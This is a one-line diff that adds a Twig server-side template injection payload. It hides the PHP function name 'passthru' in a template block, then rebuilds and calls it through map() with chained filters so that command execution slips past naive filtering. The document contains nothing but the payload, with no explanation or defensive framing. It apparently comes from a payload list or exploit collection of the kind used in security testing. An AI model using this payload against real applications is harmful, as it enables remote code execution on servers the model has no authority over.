@@ -1,0 +1,1 @@
+{%block U%}passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
